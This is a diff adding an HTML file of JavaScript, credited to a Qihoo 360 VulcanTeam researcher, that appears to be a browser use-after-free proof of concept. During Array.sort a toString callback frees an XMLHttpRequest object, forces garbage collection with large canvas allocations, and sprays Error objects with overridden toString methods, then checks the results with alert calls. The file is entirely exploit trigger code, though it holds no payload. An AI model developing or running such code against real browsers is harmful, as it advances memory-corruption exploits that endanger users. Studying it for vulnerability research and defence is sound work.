@@ -1,0 +1,41 @@
+<script>////written by Wei of Qihoo 360 VulcanTeam
+alert(a);
+
+function gc() {
+    try {
+        var c = document.createElement("canvas");
+        var gl = c.getContext("2d");
+
+        for (var i = 0; i < 2; i++) {
+            var gggg = gl.createImageData(1, 0x1000000)
+        }
+    } catch (e) {
+
+    }
+}
+function sleep(d){
+  for(var t = Date.now();Date.now() - t <= d;);
+}
+
+var c = new Array(0x1000)
+var b = new XMLHttpRequest()
+var a = [1,{toString:function(){
+ a[2] = {};
+ b = null
+ //for(var i=0;i<0x10;i++){
+ gc();
+ //}
+ //sleep(1000)
+ //alert(111)
+ for (var j=0; j < c.length; j++) {
+	c[j] = new Error()
+	c[j].toString = function(){alert('ok'); return '666'}
+ }
+ return "aaa";
+}}, b, 2]
+a.sort();
+alert(a[0]);
+alert(a[1]);
+alert(a[2]);
+alert(a[3]);
+</script>
